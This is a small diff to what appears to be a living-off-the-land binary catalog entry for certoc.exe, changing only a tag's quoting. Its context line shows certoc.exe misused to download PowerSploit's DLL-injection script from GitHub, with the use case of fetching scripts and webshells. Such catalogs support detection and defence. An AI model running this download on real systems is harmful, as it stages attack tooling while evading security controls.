@@ -11,7 +11,7 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows Server 2022
-    Tags: [DLL]
+    Tags: ['DLL']
   - Command: certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
     Description: Downloads text formatted files
     Usecase: Download scripts, webshells etc.
